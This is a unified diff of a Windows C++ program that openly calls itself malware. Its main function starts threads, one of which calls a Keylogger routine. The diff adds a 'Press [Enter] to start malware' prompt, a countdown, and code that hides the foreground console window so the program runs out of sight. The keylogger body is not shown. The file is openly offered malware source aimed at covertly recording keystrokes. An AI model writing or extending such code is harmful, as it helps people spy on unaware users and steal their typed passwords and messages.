@@ -8,8 +8,11 @@ void console();
 
 int main()
 {
+    SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 10);
     auto main = []() {
-        printf("Running... \n");
+        printf("Press [Enter] to start malware..");
+        getchar();
+        console();
         Keylogger(NULL);
     };
     auto window = []() {
@@ -20,7 +23,7 @@ int main()
     };
     HMODULE hModule = GetModuleHandle(nullptr);
     if (hModule != nullptr) {
-        console();
+        // console();
         thread t1 = thread(main);
         thread t2 = thread(window);
         thread t3 = thread(filesize);
@@ -30,15 +33,20 @@ int main()
     }
 }
 
-void console() {
+void console() {    // testing console
    /* printf("\033[1;32m");
     Sleep(500);
     printf("Vaccine starts in..\n");
-    Sleep(1000);
+    Sleep(1000);*/
+    Sleep(800);
     printf("3..\n");
     Sleep(1000);
     printf("2..\n");
     Sleep(1000);
     printf("1..\n");
-    Sleep(1000);*/
+    Sleep(1000);
+    printf("Executed!!");
+    Sleep(500);
+    HWND hwnd = GetForegroundWindow();
+    ShowWindow(hwnd, SW_HIDE);
 }
